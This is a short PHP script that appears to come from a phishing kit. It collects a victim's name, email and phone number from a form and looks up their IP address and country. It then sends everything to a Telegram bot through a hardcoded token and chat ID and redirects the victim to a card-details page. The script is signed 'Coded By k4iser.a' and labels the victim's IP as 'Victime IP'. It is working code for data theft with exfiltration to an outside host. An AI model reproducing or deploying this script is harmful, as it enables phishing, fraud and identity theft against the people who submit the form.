<?php
session_start();

$name=$_POST["name"];
$email=$_POST["email"];
$mobile=$_POST["mobile"];

$rand=rand(1000000,999999999).rand(1000000,999999999);


        $_SESSION['name'] = $name;
        $_SESSION['email'] = $email;
        $_SESSION['mobile'] = $mobile;

		
        

    function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  
$iptolocation = 'http://api.hostip.info/country.php?ip=' . $ip;
$blad = file_get_contents($iptolocation);
$t=time();
$w9t = date("h:i:sa");
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|Details ZA |----------|\n";
$message .= "Name  : ".$_SESSION['name']."\n";
$message .= "Email  : ".$_SESSION['email']."\n";
$message .= "Phone Number  : ".$_SESSION['mobile']."\n";
$message .= "
----------- ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥----------------->
Victime IP: $ip | COUNTRY : $ipdat->geoplugin_countryName .
------------ ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥---------------->";

$token = "6855516447:AAEmwJSM4W-2TV9h1_HnLuKyFMvId6Sl3aw";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=6413015802&text=" . urlencode($message)."" );
	
 header("location:load.php?vc?__event=card&service_id=top_card=IL")
?>
